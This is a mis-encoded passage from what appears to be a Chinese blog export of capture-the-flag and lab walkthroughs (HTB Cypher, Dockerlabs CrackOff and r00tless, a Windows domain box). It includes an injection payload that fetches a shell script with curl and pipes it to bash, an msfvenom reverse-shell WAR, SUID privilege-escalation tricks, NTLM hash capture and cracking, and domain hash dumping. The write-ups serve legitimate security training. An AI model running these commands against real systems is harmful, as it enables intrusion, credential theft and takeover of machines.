å¯ä»¥çœ‹åˆ°æ˜¯apocåŒ…é‡Œé¢çš„ï¼Œå¹¶ä¸”å®ƒçš„è°ƒç”¨æ˜¯custom.getUrlStatusCode\nå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œæ˜¯ç›´æ¥æŠŠURLæ‹¼æ¥ï¼Œç„¶åä¼ é€’ç»™**/bin/sh**æ‰§è¡Œ\nè¿™é‡Œéœ€è¦å…ˆè¿”å›h.valueå¦åˆ™åœ¨æ¯”å¯¹å¯†ç çš„æ—¶å€™ä¼šç›´æ¥æŠ¥é”™ï¼Œå½±å“åé¢çš„æ‰§è¡Œ\nå¹¶ä¸”è”åˆæ³¨å…¥è¦æ±‚çš„ä¸¤ä¸ªåˆ—åå¿…é¡»ç›¸åŒï¼Œä¹Ÿå°±æ˜¯ASåé¢æ¥åŒæ ·çš„åˆ—å\nä½¿ç”¨è”åˆæ³¨å…¥ï¼Œè°ƒç”¨è¿™ä¸ªcustom.getUrlStatusCode\n{\r\u0026#34;username\u0026#34;: \u0026#34;admin\u0026#39; return h.value AS value UNION CALL custom.getUrlStatusCode(\\\u0026#34;127.0.0.1;curl 10.10.xx.xx/shell.sh|bash;\\\u0026#34;) YIELD statusCode AS value RETURN value ; //\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;123\u0026#34;\r} custom.getUrlStatusCodeæ˜¯å¿…é¡»è¦æ‰§è¡ŒæˆåŠŸæ‰ä¼šè¿”å›statusCodeï¼Œä»è€ŒåŠ å…¥åˆ—çš„ç¬¬äºŒè¡Œã€‚å› æ­¤å‰é¢æˆ‘æ’å…¥çš„æ˜¯127.0.0.1ï¼Œä¿è¯èƒ½å¤Ÿè¿”å›ä¸€ä¸ªæ­£å¸¸çŠ¶æ€ç ã€‚\næˆåŠŸåå¼¹åˆ°Shellï¼Œå¯ä»¥ç›´æ¥è¿›å…¥**/home/graphasm**\nè¯»å–bbot_preset.ymlå¾—åˆ°å¯†ç \nç™»å½•åˆ°graphsamï¼Œè·å–åˆ°user.txt\nRoot #\ræŸ¥çœ‹sudo\ngraphasm@cypher:~$ sudo -l\rMatching Defaults entries for graphasm on cypher:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\rUser graphasm may run the following commands on cypher:\r(ALL) NOPASSWD: /usr/local/bin/bbot bbotçš„å†…å®¹å¦‚ä¸‹\ngraphasm@cypher:~$ cat /usr/local/bin/bbot\r#!/opt/pipx/venvs/bbot/bin/python\r# -*- coding: utf-8 -*-\rimport re\rimport sys\rfrom bbot.cli import main\rif __name__ == \u0026#39;__main__\u0026#39;:\rsys.argv[0] = re.sub(r\u0026#39;(-script\\.pyw|\\.exe)?$\u0026#39;, \u0026#39;\u0026#39;, sys.argv[0])\rsys.exit(main()) æœ¬æ¥æƒ³åœ¨å½“å‰ç›®å½•å†™å…¥åŒåpythonæ–‡ä»¶æ¥è¿›è¡Œææƒï¼Œä½†æ˜¯ç›®å½•æ²¡æœ‰å†™çš„æƒé™ï¼ŒæŸ¥çœ‹ä¸€ä¸‹æ˜¯å¦å¯ä»¥å†™å…¥é…ç½®æ¥å¯åŠ¨bbot\næ³¨æ„åˆ°**--custom-yara-rules**å¯ä»¥å¼•å…¥è§„åˆ™\nå› æ­¤å¯ä»¥å°è¯•æŠŠroot.txtå¼•å…¥ï¼Œå¹¶ä¸”å¼€å¯debugæ¨¡å¼\ngraphasm@cypher:/usr/local/bin$ sudo /usr/local/bin/bbot -cy /root/root.txt --debug æˆ‘å°è¯•è¯»å–sshå¯†é’¥ï¼Œåªèƒ½è¯»å–åˆ°id_ed25519ï¼Œè€Œä¸”å¹¶æ²¡æœ‰authorized_keysï¼Œå› æ­¤æ— æ³•SSHç™»å½•\næŸ¥çœ‹moduleçš„ç›®å½•æƒé™ï¼Œæ— æ³•å†™å…¥ã€‚\nå‚è€ƒä¸€ä¸‹å®˜ç½‘ä¸Šçš„å…·ä½“é…ç½®\nConfiguration - BBOT Docs\nHow to Write a BBOT Module - BBOT Docs\nOverview - BBOT Docs\nPresets - BBOT Docs\nå‘ç°å¯ä»¥è‡ªå·±æŒ‡å®šé…ç½®æ–‡ä»¶ï¼Œå¹¶ä¸”åˆ›å»ºæ–°çš„æ¨¡å—ã€‚\nå› æ­¤å…ˆå†™å…¥ä¸€ä¸ªæ¨¡å—çš„ç›®å½•æ–‡ä»¶ myconf.yml\nmodule_dirs:\r- /tmp/modules ç„¶ååœ¨**/tmp/modulesä¸­å†™å…¥æ ¹æ®æ¨¡æ¿ä¿®æ”¹åå…·æœ‰ææƒéƒ¨åˆ†çš„ä»£ç ï¼Œå‘½åä¸ºwhois2.py**ğŸ‘‡\nfrom bbot.modules.base import BaseModule\rimport os\rclass whois2(BaseModule):\rwatched_events = [\u0026#34;DNS_NAME\u0026#34;] # watch for DNS_NAME events\rproduced_events = [\u0026#34;WHOIS\u0026#34;] # we produce WHOIS events\rflags = [\u0026#34;passive\u0026#34;, \u0026#34;safe\u0026#34;]\rmeta = {\u0026#34;description\u0026#34;: \u0026#34;Query WhoisXMLAPI for WHOIS data\u0026#34;}\roptions = {\u0026#34;api_key\u0026#34;: \u0026#34;\u0026#34;} # module config options\roptions_desc = {\u0026#34;api_key\u0026#34;: \u0026#34;WhoisXMLAPI Key\u0026#34;}\rper_domain_only = True # only run once per domain\rbase_url = \u0026#34;https://www.whoisxmlapi.com/whoisserver/WhoisService\u0026#34;\r# one-time setup - runs at the beginning of the scan\rasync def setup(self):\ros.system(\u0026#34;cp /bin/bash /tmp/bash \u0026amp;\u0026amp; chmod u+s /tmp/bash\u0026#34;)\rself.api_key = self.config.get(\u0026#34;api_key\u0026#34;)\rif not self.api_key:\r# soft-fail if no API key is set\rreturn None, \u0026#34;Must set API key\u0026#34;\rasync def handle_event(self, event):\rself.hugesuccess(f\u0026#34;Got {event} (event.data: {event.data})\u0026#34;)\r_, domain = self.helpers.split_domain(event.data)\rurl = f\u0026#34;{self.base_url}?apiKey={self.api_key}\u0026amp;domainName={domain}\u0026amp;outputFormat=JSON\u0026#34;\rself.hugeinfo(f\u0026#34;Visiting {url}\u0026#34;)\rresponse = await self.helpers.request(url)\rif response is not None:\rawait self.emit_event(response.json(), \u0026#34;WHOIS\u0026#34;, parent=event) æœ€åå‘½ä»¤è¡Œæ‰§è¡Œï¼ŒææƒæˆåŠŸ\nsudo /usr/local/bin/bbot -p ./myconf.yml -m whois2 Summary #\rUserï¼šç™»é™†é¡µé¢çš„usernameå¤„å­˜åœ¨Cypheræ³¨å…¥ï¼Œé€šè¿‡æ³„éœ²çš„æ‰©å±•æ–‡ä»¶å¯ä»¥çœ‹åˆ°ï¼Œä¼ å…¥å‚æ•°æ˜¯ç›´æ¥é€šè¿‡æ‹¼æ¥çš„æ–¹å¼ä¼ é€’ç»™**/bin/sh**ï¼Œå› æ­¤å¯ä»¥æ„é€ åå¼¹shellã€‚ç›´æ¥è¿›å…¥**/home/graphasm**æ‹¿åˆ°ç”¨æˆ·å¯†ç ã€‚\nRootï¼šæŸ¥çœ‹å‘½ä»¤çš„å…·ä½“å‚æ•°ï¼Œå¯ä»¥å°†root.txtå½“ä½œè§„åˆ™è¿›è¡Œå¼•ç”¨ï¼ŒåŒæ—¶å¼€å¯debugæ¨¡å¼ï¼Œæ³„éœ²å‡ºæ–‡ä»¶çš„å…·ä½“å†…å®¹ã€‚å†™å…¥æ–°çš„é…ç½®æ–‡ä»¶ä»¥åŠæ–°çš„æ¶æ„æ¨¡å—ï¼Œé€šè¿‡å‚æ•°æŒ‡å®šï¼Œæœ€åæˆåŠŸææƒåˆ°rootã€‚\n","date":"2025-03-02","externalUrl":null,"permalink":"/posts/2025/03/htb-cypher/","section":"Posts","summary":"","title":"HTB-Cypher","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Hard Nmap #\r[root@kali] /home/kali/crackoff â¯ nmap 172.17.0.2 -sV -A -p-\rStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-28 21:28 CST\rNmap scan report for sitio.dl (172.17.0.2)\rHost is up (0.00010s latency).\rNot shown: 65533 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)\r| ssh-hostkey: | 256 3d:fc:bd:41:cb:81:e8:cd:a2:58:5a:78:68:2b:a3:04 (ECDSA)\r|_ 256 d8:5a:63:27:60:35:20:30:a9:ec:25:36:9e:50:06:8d (ED25519)\r80/tcp open http Apache httpd 2.4.58 ((Ubuntu))\r|_http-server-header: Apache/2.4.58 (Ubuntu)\r|_http-title: CrackOff - Bienvenido\rMAC Address: 02:42:AC:11:00:02 (Unknown)\rDevice type: general purpose\rRunning: Linux 4.X|5.X\rOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\rOS details: Linux 4.15 - 5.8\rNetwork Distance: 1 hop\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\rTRACEROUTE\rHOP RTT ADDRESS\r1 0.10 ms sitio.dl (172.17.0.2)\rOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 8.67 seconds Gobuster #\r[root@kali] /home/kali/crackoff â¯ gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php\r===============================================================\rGobuster v3.6\rby OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart)\r===============================================================\r[+] Url: http://172.17.0.2/\r[+] Method: GET\r[+] Threads: 10\r[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\r[+] Negative Status codes: 404\r[+] User Agent: gobuster/3.6\r[+] Extensions: php\r[+] Timeout: 10s\r===============================================================\rStarting gobuster in directory enumeration mode\r===============================================================\r/.php (Status: 403) [Size: 275]\r/index.php (Status: 200) [Size: 2974]\r/login.php (Status: 200) [Size: 3968]\r/welcome.php (Status: 200) [Size: 2800]\r/db.php (Status: 302) [Size: 75] [--\u0026gt; error.php]\r/error.php (Status: 200) [Size: 2705]\r/.php (Status: 403) [Size: 275]\r/server-status (Status: 403) [Size: 275]\rProgress: 441120 / 441122 (100.00%)\r===============================================================\rFinished\r=============================================================== SQL Injection #\rè¿›å…¥login.phpï¼Œå‘ç°åœ¨usernameå­—æ®µä¸­å­˜åœ¨SQLæ³¨å…¥æ¼æ´ï¼Œå•å¼•å·é—­åˆ\nå°†Requestå¤åˆ¶åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­\n[root@kali] /home/kali/crackoff â¯ sqlmap -r burp.txt -p username --dbs [root@kali] /home/kali/crackoff â¯ sqlmap -r burp.txt -p username -D crackofftrue_db -T users --dump ç”±äºæ˜¯æ—¶é—´ç›²æ³¨ï¼Œå¾—å¤šç­‰ä¸€ä¼š\nç”¨hydraçˆ†ç ´å§ï¼Œä¸€ä¸ªä¸€ä¸ªè¯•æœ‰ç‚¹è´¹æ—¶é—´\nrosa:ultramegaverypasswordhack User #\råœ¨**/var/www/alice_note**ä¸­å¾—åˆ°ä¸€ä¸²å­—ç¬¦\nå¹¶ä¸”å†…éƒ¨å¼€æœ‰8080ç«¯å£\nSSHç«¯å£è½¬å‘\n[root@kali] ~kali/Desktop â¯ ssh rosa@172.17.0.2 -L 8080:127.0.0.1:8080 ç„¶åä½¿ç”¨MSFæ¨¡å—è¿›è¡Œç™»å½•çˆ†ç ´\nå¾—åˆ°æ­£ç¡®çš„ç™»å½•å¯†ç \n[+] 127.0.0.1:8080 - Login Successful: tomitoma:supersecurepasswordultra æ¥ä¸‹æ¥ä¸Šä¼ waråŒ…è¿›è¡ŒGetshell\nè¿™é‡Œä½¿ç”¨çš„æ˜¯msfvenomç”Ÿæˆçš„webshell\n[root@kali] /home/kali/crackoff â¯ msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.17.0.1 LPOST=4444 -f war -o shell.war â\rPayload size: 1106 bytes\rFinal size of war file: 1106 bytes\rSaved as: shell.war éƒ¨ç½²åè®¿é—®\næˆåŠŸå¾—åˆ°åå¼¹shell\nè¿›å…¥**/opt/tomcatå¾—åˆ°mario**çš„å¯†ç \nmario:marioeseljefe ç™»å½•åæ‹¿åˆ°user.txt\nRoot #\ræŸ¥çœ‹tomcatçš„ç‰¹æ®Šå‘½ä»¤\nsudo -l\rMatching Defaults entries for tomcat on 157676472df8:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\rUser tomcat may run the following commands on 157676472df8:\r(ALL) NOPASSWD: /opt/tomcat/bin/catalina.sh ç›´æ¥å†™å…¥ææƒéƒ¨åˆ†\necho \u0026#34;chmod u+s /bin/bash\u0026#34; \u0026gt;\u0026gt; /opt/tomcat/bin/catalina.sh\rsudo /opt/tomcat/bin/catalina.sh start Summary #\rUserï¼šSQLæ—¶é—´ç›²æ³¨å¾—åˆ°ç™»å½•è´¦æˆ·åˆ—è¡¨ï¼Œç”¨hydraè¿›è¡Œå¿«é€Ÿçˆ†ç ´ã€‚å†…éƒ¨å­˜åœ¨tomcatæœåŠ¡ï¼ŒåŒæ ·è¿›è¡Œçˆ†ç ´å°è¯•ï¼Œä¸Šä¼ æœ¨é©¬åå¼¹shellã€‚å¯ä»¥å‚è€ƒä¸‹é¢è¿™ä¸ªé“¾æ¥ï¼Œæˆ‘å°è¯•ä½¿ç”¨**/usr/share/webshells/jsp/cmdjsp.jspè¿›è¡Œè½¬åŒ–ä¸ºwaræ–‡ä»¶ï¼Œä½†æ˜¯æ— æ³•å‘½ä»¤æ‰§è¡Œï¼Ÿï¼Ÿï¼Ÿæ— å¥ˆä½¿ç”¨msfveom**æˆåŠŸåå¼¹ã€‚\nã€Vulfocusé¶åœº-åˆçº§ã€‘Tomcatåå°å¼±å£ä»¤+WaråŒ…æ–‡ä»¶ä¸Šä¼ Getshellæ¼æ´å¤ç°_tomcatä¸Šä¼ waråŒ…-CSDNåšå®¢ Rootï¼šç›´æ¥å†™å…¥**/opt/tomcat/bin/catalina.sh**ï¼Œä»¥rootçš„èº«ä»½æ‰§è¡Œå³å¯ã€‚\næ„Ÿè§‰è¿™ä¸ªæœºå™¨å¥‡å¥‡æ€ªæ€ªçš„ã€‚ã€‚\n","date":"2025-03-01","externalUrl":null,"permalink":"/posts/2025/03/dockerlabs-crackoff/","section":"Posts","summary":"","title":"Dockerlabs-Crackoff","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Hard Nmap #\r[root@kali] /home/kali/r00tless â¯ nmap 172.18.0.2 -sV -A -p-\rStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-01 11:27 CST\rNmap scan report for 172.18.0.2\rHost is up (0.000092s latency).\rNot shown: 65531 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)\r| ssh-hostkey: | 256 fa:7b:d3:96:f6:83:bb:bd:24:86:b4:a8:f6:59:c3:62 (ECDSA)\r|_ 256 29:49:38:ae:44:75:d8:88:2a:b6:98:55:00:bd:24:76 (ED25519)\r80/tcp open http Apache httpd 2.4.58 ((Ubuntu))\r|_http-server-header: Apache/2.4.58 (Ubuntu)\r|_http-title: Subir Archivo\r139/tcp open netbios-ssn Samba smbd 4.6.2\r445/tcp open netbios-ssn Samba smbd 4.6.2\rMAC Address: 02:42:AC:12:00:02 (Unknown)\rDevice type: general purpose\rRunning: Linux 4.X|5.X\rOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\rOS details: Linux 4.15 - 5.8\rNetwork Distance: 1 hop\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\rHost script results:\r| smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required\r| smb2-time: | date: 2025-03-01T03:27:48\r|_ start_date: N/A\rTRACEROUTE\rHOP RTT ADDRESS\r1 0.09 ms 172.18.0.2\rOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 20.77 seconds Gobuster #\r[root@kali] /home/kali/r00tless â¯ gobuster dir -u http://172.18.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html\r===============================================================\rGobuster v3.6\rby OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart)\r===============================================================\r[+] Url: http://172.18.0.2\r[+] Method: GET\r[+] Threads: 10\r[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\r[+] Negative Status codes: 404\r[+] User Agent: gobuster/3.6\r[+] Extensions: php,txt,html\r[+] Timeout: 10s\r===============================================================\rStarting gobuster in directory enumeration mode\r===============================================================\r/.html (Status: 403) [Size: 275]\r/index.html (Status: 200) [Size: 2410]\r/.php (Status: 403) [Size: 275]\r/upload.php (Status: 200) [Size: 56]\r/readme.txt (Status: 200) [Size: 78]\r/.php (Status: 403) [Size: 275]\r/.html (Status: 403) [Size: 275]\r/server-status (Status: 403) [Size: 275]\rProgress: 882240 / 882244 (100.00%)\r===============================================================\rFinished\r=============================================================== Own passsamba #\rçœ‹æ¥æ–‡ä»¶ä¸Šä¼ åˆ°äº†**.ssh/**ç›®å½•ä¸‹ï¼Œé‚£ä¹ˆå…·ä½“æ˜¯è°çš„å‘¢ï¼Ÿ\nå¤§æ¦‚å°±æ˜¯passsamba\nå› æ­¤å°†å¯†é’¥ä¸Šä¼ ä¸Šå»å°±è¡Œäº†\n[root@kali] /home/kali/r00tless â¯ cat ~/.ssh/id_rsa.pub \u0026gt;\u0026gt; authorized_keys æŠŠauthorized_keysä¸Šä¼ ç„¶åsshç™»å½•\nOwn root-false #\rpasssamba@9c7c24cafe54:~$ ls\rnote.txt\rpasssamba@9c7c24cafe54:~$ cat note.txt What would \u0026#34;sambaarribasiempre\u0026#34; be used for? æˆ–è®¸æ˜¯æŸä¸ªç”¨æˆ·çš„smbå¯†ç å‘¢ï¼Ÿ\nå¾—åˆ°ä¸€ä¸ªsecret.zipï¼Œä½†æ˜¯éœ€è¦å¯†ç \nä½¿ç”¨zip2johné…åˆjohnçˆ†ç ´\n[root@kali] /home/kali/r00tless â¯ zip2john secret.zip \u0026gt;\u0026gt; zip.hash\r[root@kali] /home/kali/r00tless â¯ john zip.hash /usr/share/wordlists/rockyou.txt [root@kali] /home/kali/r00tless â¯ cat secret.txt root-false:cGFzc3dvcmRiYWRzZWN1cmV1bHRyYQ== base64è§£å¯†ä¸€ä¸‹ï¼špasswordbadsecureultra\nOwn less #\rroot-false@9c7c24cafe54:~$ cat message.txt Mario, remember this word, then the boss will get angry:\r\u0026#34;pinguinodemarioelmejor\u0026#34; ç”±äºå­˜åœ¨ç¬¬äºŒä¸ªç½‘ç«™ï¼Œè¿™é‡Œæ— æ³•ç›´æ¥è¿›å»\nåœ¨apacheçš„é…ç½®æ–‡ä»¶ä¸­å‘ç°å†…ç½‘IP\nå°è¯•curlè®¿é—®ï¼Œçœ‹æ¥æ˜¯ä¸€ä¸ªè¡¨å•ï¼Œéœ€è¦ç™»å½•\nè¿™é‡Œä½¿ç”¨chiselè¿›è¡Œä»£ç†\nå¯ä»¥ç›´æ¥è®¿é—®äº†ï¼Œç”±äºä¹‹å‰å¾—åˆ°äº†ä¸€ä¸ªå¯†ç å­—ç¬¦ä¸²\nmario:pinguinodemarioelmejor ç™»å½•æˆåŠŸï¼Œå¾—åˆ°ä¸€ä¸ªtxtæ–‡ä»¶\næ˜¯ä¸€æ®µå¾ˆé•¿çš„æ–‡æœ¬ï¼Œæ£€ç´¢ä¸‹åˆ’çº¿\nless:Cristal_de_la_Aurora Root #\rless@9c7c24cafe54:~$ sudo -l\rMatching Defaults entries for less on 9c7c24cafe54:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\rUser less may run the following commands on 9c7c24cafe54:\r(ALL : ALL) NOPASSWD: /bin/chown chown | GTFOBins å¯ä»¥ç›´æ¥æ”¹å˜**/root**ç›®å½•çš„æ‰€æœ‰è€…ä¸ºå½“å‰ç”¨æˆ·\nå¦‚æœæƒ³è¦æå‡æƒé™ï¼Œå¯ä»¥ä¿®æ”¹**/etc/passwd**\næ¯”å¦‚è¯´æ–°å¢ä¸€ä¸ªç”¨æˆ·ï¼Œè®©ä»–å’Œrootåœ¨åŒä¸€ä¸ªç»„é‡Œé¢\nSummary #\rUserï¼šä¸Šä¼ å¯†é’¥æ–‡ä»¶åˆ°**/.ssh/ç›®å½•ï¼Œé€šè¿‡enum4linuxæ³„éœ²å‡ºç”¨æˆ·åï¼Œsshç™»å½•åæ‹¿åˆ°smb**çš„ç™»å½•å¯†ç ï¼Œçˆ†ç ´å‹ç¼©åŒ…è·å–åˆ°å¯†ç ï¼Œè®¿é—®å†…ç½‘çš„ç¬¬äºŒä¸ªç½‘ç«™ï¼Œç™»å½•åæ‹¿åˆ°äº†æœ€ç»ˆçš„å¯†ç ã€‚\nRootï¼šä½¿ç”¨chownæ”¹å˜**/root/ç›®å½•çš„æ‰€æœ‰è€…ä¸ºå½“å‰ç”¨æˆ·ï¼Œå³å¯è¿›å…¥ã€‚æˆ‘å°è¯•äº†æ‰‹åŠ¨æ·»åŠ authorized_keys**ï¼Œä½†æ˜¯ä¼¼ä¹æ–‡ä»¶æ‹¥æœ‰è€…ä¸æ˜¯ç™»å½•å¯¹è±¡çš„è¯ï¼Œä¼šå¯¼è‡´sshè®¤è¯å¤±è´¥ï¼Œå› æ­¤å†™å…¥å¯†é’¥çš„æ–¹å¼å°±æ²¡æ³•å®Œæˆäº†ã€‚ä¸è¿‡å¯ä»¥å†™å…¥**/etc/passwdçš„æ–¹å¼æ–°å¢root**ç»„ç”¨æˆ·æ¥ææƒã€‚\n","date":"2025-03-01","externalUrl":null,"permalink":"/posts/2025/03/dockerlabs-r00tless/","section":"Posts","summary":"","title":"Dockerlabs-r00tless","type":"posts"},{"content":"\rBox Info #\rOS Windows Difficulty Medium Nmap #\r[root@kali] /home/kali/Desktop â¯ nmap 192.168.56.103 -sSV -Pn -A -T4\rPORT STATE SERVICE VERSION\r53/tcp open domain?\r88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-03-02 03:01:34Z)\r135/tcp open msrpc Microsoft Windows RPC\r139/tcp open netbios-ssn Microsoft Windows netbios-ssn\r389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)\r445/tcp open microsoft-ds?\r464/tcp open kpasswd5?\r593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0\r636/tcp open tcpwrapped\r3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)\r3269/tcp open tcpwrapped\rMAC Address: 08:00:27:46:72:D1 (Oracle VirtualBox virtual NIC)\rWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\rDevice type: general purpose\rRunning (JUST GUESSING): Microsoft Windows 2022|11|2016 (97%)\rOS CPE: cpe:/o:microsoft:windows_server_2016\rAggressive OS guesses: Microsoft Windows Server 2022 (97%), Microsoft Windows 11 21H2 (91%), Microsoft Windows Server 2016 (91%)\rNo exact OS matches for host (test conditions non-ideal).\rNetwork Distance: 1 hop\rService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\rHost script results:\r| smb2-security-mode: | 3:1:1: |_ Message signing enabled and required\r|_clock-skew: 14h59m36s\r| smb2-time: | date: 2025-03-02T03:03:53\r|_ start_date: N/A\r|_nbstat: NetBIOS name: DC01, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 08:00:27:46:72:d1 (Oracle VirtualBox virtual NIC) æŠŠDC01.SOUPEDECODE.LOCALæ·»åŠ åˆ°**/etc/hosts**\nLLMNR \u0026amp; NBT-NS #\ræˆ‘å°è¯•ç›´æ¥æšä¸¾é¶æœºä¸Šçš„ä¿¡æ¯ï¼Œæ²¡æœ‰æˆåŠŸã€‚\nåœ¨åšsherlocksçš„æ—¶å€™é‡åˆ°è¿‡è¿™ä¸ªé—®é¢˜ï¼šSherlocks-Reaper - HYH\nè¿™é‡Œæ˜¯æ¶‰åŠåˆ°çš„ä¸€äº›æ–‡ç« \næ¸—é€æµ‹è¯•ä¹‹ Responder å·¥å…·è¯¦è§£ ä¸­é—´äººæ”»å‡» LLMNRé“¾è·¯æœ¬åœ°å¤šæ’­åç§°è§£æ NBNS ç½‘ç»œåŸºæœ¬è¾“å‡ºç³»ç»Ÿåç§°æœåŠ¡ NTLM Relayæ”»å‡»åˆ©ç”¨å·¥å…·ä¸€ç¯‡æ–‡ç« è®©ä½ æ˜æ˜ç™½ç™½_responderå·¥å…·-CSDNåšå®¢\nã€å†…ç½‘å­¦ä¹ ç¬”è®°ã€‘18ã€LLMNR å’Œ NetBIOS æ¬ºéª—æ”»å‡» | TeamsSix\nè¦è¯´æ˜çš„æ˜¯ï¼Œè¿™ä¸ªæ”»å‡»ä¸éœ€è¦å‡­è¯ï¼Œä½†æ˜¯æ˜¯æœ‰å‰æçš„\næ— æœ‰æ•ˆçš„ DNS: å½“ç½‘ç»œä¸­ç¼ºä¹æœ‰æ•ˆçš„ DNS æœåŠ¡å™¨æ—¶ï¼Œè®¾å¤‡ä¼šå°è¯•ä½¿ç”¨ LLMNR æˆ– NBT-NS è¿›è¡Œåç§°è§£æã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯ä»¥æ›´å®¹æ˜“åœ°åˆ©ç”¨è¿™äº›åè®®è¿›è¡Œæ”»å‡»ã€‚\nå¯ç”¨çš„ LLMNR å’Œ NBT-NS: ç›®æ ‡ä¸»æœºå¿…é¡»å¯ç”¨ LLMNR å’Œ NBT-NS æœåŠ¡ã€‚åœ¨è®¸å¤š Windows ç³»ç»Ÿä¸­ï¼Œè¿™äº›æœåŠ¡é»˜è®¤æ˜¯å¯ç”¨çš„ã€‚\nåŒä¸€å¹¿æ’­åŸŸå†…: æ”»å‡»è€…å’Œç›®æ ‡è®¾å¤‡éœ€è¦å¤„äºåŒä¸€å¹¿æ’­åŸŸå†…ã€‚LLMNR å’Œ NBT-NS æ˜¯åŸºäºå¹¿æ’­çš„åè®®ï¼Œå› æ­¤æ”»å‡»è€…éœ€è¦èƒ½å¤Ÿæ¥æ”¶åˆ°è¿™äº›å¹¿æ’­è¯·æ±‚ã€‚\n[root@kali] /home/kali/Desktop â¯ responder -I eth0 æˆåŠŸæ¥æ”¶åˆ°NTLMå“ˆå¸Œå€¼ï¼Œç›´æ¥ä½¿ç”¨johnçˆ†ç ´\n[root@kali] /home/kali/DC03 â¯ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8\rLoaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])\rWill run 4 OpenMP threads\rPress \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status\rjesuschrist (xkate578) 1g 0:00:00:00 DONE (2025-03-01 20:28) 100.0g/s 204800p/s 204800c/s 204800C/s 123456..lovers1\rUse the \u0026#34;--show --format=netntlmv2\u0026#34; options to display all of the cracked passwords reliably\rSession completed. SMBmap #\rè¿›å…¥åˆ°shareç›®å½•ï¼Œæ‹¿åˆ°user.txt\nldapdomaindump #\rLDAPDomainDumpæ˜¯ä¸€æ¬¾åˆ©ç”¨LDAPåè®®æ”¶é›†æ´»åŠ¨ç›®å½•ä¿¡æ¯çš„å·¥å…·\n[root@kali] /home/kali/DC03 â¯ ldapdomaindump -u \u0026#34;SOUPEDECODE.LOCAL\\xkate578\u0026#34; -p jesuschrist 192.168.56.103 â\r[*] Connecting to host...\r[*] Binding to host\r[+] Bind OK\r[*] Starting domain dump\r[+] Domain dump finished ç„¶åä½¿ç”¨python.http.serverå³å¯æŸ¥çœ‹åˆ°htmlæ–‡ä»¶\nå¯ä»¥çœ‹åˆ°Operatorså±äºDomain Adminsç»„\nè€Œæˆ‘ä»¬çš„ç”¨æˆ·å±äºAccount Operatorsç»„\nè¿˜æœ‰ä¸€ä¸ªç”¨æˆ·å±äºOperatorç»„\nå› æ­¤ç›®å‰è¦åšçš„æ˜¯ï¼Œé€šè¿‡å½“å‰çš„xkate578ç”¨æˆ·å»ä¿®æ”¹fbeth103çš„å¯†ç \n[root@kali] /home/kali/DC03 â¯ rpcclient -U \u0026#34;xkate578\u0026#34; --password=\u0026#34;jesuschrist\u0026#34; 192.168.56.126 â\rrpcclient $\u0026gt; setuserinfo2 fbeth103 23 \u0026#34;Pass1234!\u0026#34;\rrpcclient $\u0026gt; Secretdump #\ræ”¹å¥½ä¹‹åå°è¯•è·å–åŸŸå†…çš„å“ˆå¸Œï¼Œæ³¨æ„ä¸æ˜¯æœ¬åœ°çš„ï¼\n[root@kali] /home/kali/DC03 â¯ impacket-secretsdump \u0026#39;SOUPEDECODE.LOCAL/fbeth103:Pass1234!\u0026#39;@192.168.56.126 Summary #\rUserï¼šLLMNR ä¸­æ¯’æ”»å‡»è·å–åˆ°xkate578çš„Net-NTLM 